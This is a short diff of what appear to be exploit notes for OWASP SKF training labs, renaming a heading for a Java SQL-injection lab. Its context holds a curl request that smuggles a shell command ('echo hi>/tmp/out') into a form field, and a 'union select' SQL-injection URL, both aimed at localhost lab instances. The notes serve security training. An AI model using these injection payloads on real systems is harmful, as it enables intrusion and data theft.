@@ -26,7 +26,7 @@ curl 'http://localhost:5000/home' \
   --data-raw $'------WebKitFormBoundaryQJEtZoqQ8I4ZmYVs\r\nContent-Disposition: form-data; name="size"\r\n\r\n1;echo hi>/tmp/out;\r\n------WebKitFormBoundaryQJEtZoqQ8I4ZmYVs--\r\n' \
 ```
 
-## owasp-skf-lab:java-sqli
+## blabla1337/owasp-skf-lab:java-sqli
 
 exploit
 `http://localhost:5000/home/1%20union%20select%20*%20from%20users`
